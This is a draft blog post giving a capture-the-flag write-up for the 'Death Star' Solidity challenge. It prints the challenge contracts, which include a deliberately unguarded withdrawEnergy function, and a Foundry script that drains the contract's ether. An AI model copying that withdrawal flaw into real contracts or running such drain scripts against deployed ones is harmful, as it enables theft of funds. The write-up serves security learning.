+++
date = '2024-12-30T09:04:12+05:30'
draft = true
title = 'Death Star'
categories=["Blockchain"]
series="War-Games-CTF"
tags=["Reentrancy"]
+++

# Writeup for Death-star

- Before diving into this writeup, it’s crucial to have a solid understanding of Foundry, a powerful framework for Ethereum smart contract development. Foundry will be your primary tool for writing, testing, and breaking contracts in this guide.

### Challenge Description

The Death Start is under development but the darkside ran out of funds, so they reached out to the public to help. Can you stop the Death Star from being developed?

**Author:** MaanVad3r

### The Challenge and Exploit

The below are source contracts

1. **Setup** contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "./DeathStar.sol";
import "./DarksidePool.sol";

contract Setup {
    DeathStar public deathStar;
    DarksidePool public darksidePool;

    constructor() payable {
        require(msg.value == 20 ether, "Setup requires 20 ETH");

        
        deathStar = new DeathStar();
        (bool success1, ) = address(deathStar).call{value: 10 ether}("");
        require(success1, "Failed to fund DeathStar");

       
        darksidePool = new DarksidePool(address(deathStar));
        (bool success2, ) = address(darksidePool).call{value: 10 ether}("");
        require(success2, "Failed to fund DarksidePool");

       
        require(address(deathStar).balance > 0, "DeathStar must have initial balance");
    }

    function isSolved() external view returns (bool) {
        return address(deathStar).balance == 0;
    }
}

```

2. **DeathStar** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract DeathStar {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        require(msg.value > 0, "Must deposit non-zero ETH");
        balances[msg.sender] += msg.value;
    }


    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    
    function calculateDeathStarEnergy(uint256 input) public pure returns (uint256) {
        uint256 energy;
        assembly {
            let factor := 0x42 
            energy := mul(input, factor)
            energy := add(energy, 0x5a) 
        }
        return energy;
    }

    
    function encodeDeathStarPlans(bytes memory data) public pure returns (bytes memory) {
        bytes memory encoded;
        assembly {
            let len := mload(data)
            encoded := mload(0x40)
            mstore(0x40, add(encoded, add(len, 0x20)))
            mstore(encoded, len)
            let ptr := add(encoded, 0x20)
            for { let i := 0 } lt(i, len) { i := add(i, 1) } {
                let char := byte(0, mload(add(data, add(i, 0x20))))
                mstore8(add(ptr, i), xor(char, 0xff)) 
            }
        }
        return encoded;
    }


    function withdrawEnergy(uint256 amount) external {

        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0; 
    }

    
    function selfDestructCountdown(uint256 start) public pure returns (uint256) {
        uint256 countdown;
        assembly {
            countdown := start
            for { } gt(countdown, 0) { countdown := sub(countdown, 1) } {
                
                let waste := mul(countdown, countdown)
                waste := add(waste, 0xdeadbeef)
            }
        }
        return countdown;
    }

    
    function decryptDeathStarMessage(bytes32 encrypted) public pure returns (bytes32) {
        bytes32 decrypted;
        assembly {
            decrypted := xor(encrypted, 0x0123456789abcdef0123456789abcdef) 
        }
        return decrypted;
    }

    receive() external payable {}

}

```

3. **DarkSidePool**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IDeathStar {
    function deposit() external payable;
    function withdrawEnergy(uint256 amount) external;
}

contract DarksidePool {
    IDeathStar public starWarsTheme;

    constructor(address _starWarsTheme) {
        starWarsTheme = IDeathStar(_starWarsTheme);
    }

    function depositToStarWars() external payable {
        require(msg.value > 0, "Must send ETH to deposit");
        starWarsTheme.deposit{value: msg.value}();
    }



    
    function generateDarkSidePower(uint256 input) public pure returns (uint256) {
        uint256 powerLevel;
        assembly {
            let basePower := 0x66 
            powerLevel := mul(input, basePower)
            powerLevel := xor(powerLevel, 0xdeadbeef) 
        }
        return powerLevel;
    }

    
    function encryptSithHolocron(bytes memory data) public pure returns (bytes memory) {
        bytes memory encrypted;
        assembly {
            let len := mload(data)
            encrypted := mload(0x40)
            mstore(0x40, add(encrypted, add(len, 0x20)))
            mstore(encrypted, len)
            let ptr := add(encrypted, 0x20)
            for { let i := 0 } lt(i, len) { i := add(i, 1) } {
                let char := byte(0, mload(add(data, add(i, 0x20))))
                mstore8(add(ptr, i), xor(char, 0xa5)) // XOR with 0xa5 for obfuscation
            }
        }
        return encrypted;
    }

    function withdrawFromStarWars(uint256 amount) external {
        starWarsTheme.withdrawEnergy(amount);
    }

    
    function simulateDarkSideCorruption(uint256 start) public pure returns (uint256) {
        uint256 corruptionLevel;
        assembly {
            corruptionLevel := start
            for { } gt(corruptionLevel, 0) { corruptionLevel := sub(corruptionLevel, 1) } {
                
                let chaos := mul(corruptionLevel, corruptionLevel)
                chaos := add(chaos, 0x42)
            }
        }
        return corruptionLevel;
    }

    
    function decodeSithProphecy(bytes32 encrypted) public pure returns (bytes32) {
        bytes32 decoded;
        assembly {
            decoded := xor(encrypted, 0xdeadbeefcafebabe1234567890abcdef) 
        }
        return decoded;
    }

    
    function calculateForceImbalance(uint256 darkForce, uint256 lightForce) public pure returns (uint256) {
        uint256 imbalance;
        assembly {
            imbalance := sub(darkForce, lightForce)
            imbalance := xor(imbalance, 0xbeef) 
        }
        return imbalance;
    }

    receive() external payable {}

}

```

The Setup contract initializes both the `Deathstar` and `DarksidePool` contracts with 10 ether each. Our task is to make `Setup:isSolved` return true. This function will return true only when the balance of Deathstar becomes zero. Therefore, we need to find a way to drain the balance of Deathstar in order to solve the challenge.


```solidity
function withdrawEnergy(uint256 amount) external {

        
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");

    balances[msg.sender] = 0; 
}
```

In the `DeathStar:withdrawEnergy` function, it takes an amount parameter as input. The function then transfers the specified amount to the msg.sender (the caller) using a low-level call function. After the transfer, it updates the balance of msg.sender to zero.

So, if we simply call this function and pass `10 ether` as the amount, the contract's balance will be drained.

The below is the exploit script.

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IDeathStar{
    function withdrawEnergy(uint256 amount) external; 
}

interface ISetup{
    function deathStar() external view returns(IDeathStar);
}

contract createExploit is Script{
    function run()public{
        address _setup=/* YOUR+_SETUP_ADDRESS*/;
        vm.startBroadcast();
        ISetup setup=ISetup(_setup);
        IDeathStar deathStar=setup.deathStar();
        deathStar.withdrawEnergy(10 ether);
        vm.stopBroadcast();
    }
}

```


<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>